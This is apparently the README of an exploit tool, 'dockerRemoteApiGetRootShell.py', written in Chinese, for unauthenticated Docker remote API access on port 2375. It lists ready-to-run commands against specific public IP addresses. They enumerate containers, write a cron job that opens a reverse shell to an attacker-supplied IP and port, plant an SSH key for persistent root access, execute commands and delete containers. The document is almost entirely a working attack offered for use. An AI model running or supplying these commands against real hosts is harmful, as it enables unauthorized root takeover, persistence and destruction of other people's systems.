# docker_api_vul
docker 未授权访问漏洞利用脚本

##安装类库

    pip install -r requirements.txt

##查看运行的容器

    python dockerRemoteApiGetRootShell.py -h 139.217.25.172 -p 2375

##查看所有的容器

    python dockerRemoteApiGetRootShell.py -h 139.217.25.172 -p 2375 -a

##查看所有镜像

    python dockerRemoteApiGetRootShell.py -h 139.217.25.172 -p 2375 -l

##查看端口映射

    python dockerRemoteApiGetRootShell.py -h 139.217.25.172 -p 2375 -L

##写计划任务（centos,redhat等,加-u参数用于ubuntu等）

    python dockerRemoteApiGetRootShell.py -h 158.85.173.113 -p 2375 -C -i 镜像名 -H 反弹ip -P 反弹端口
    python dockerRemoteApiGetRootShell.py -h 158.85.173.113 -p 2375 -C -u -i 镜像名 -H 反弹ip -P 反弹端口

##写sshkey(自行修改脚本的中公钥)

    python dockerRemoteApiGetRootShell.py -h 158.85.173.113 -p 2375 -C -i 镜像名 -k

##在容器中执行命令

    python dockerRemoteApiGetRootShell.py -h 158.85.173.113 -p 2375 -e "id" -I 容器id

##删除容器

    python dockerRemoteApiGetRootShell.py -h 158.85.173.113 -p 2375 -c -I 容器id

##修改client api版本

    python dockerRemoteApiGetRootShell.py -h 158.85.173.113 -p 2375 -v 1.22

##查看服务端api版本

    python dockerRemoteApiGetRootShell.py -h 158.85.173.113 -p 2375 -V

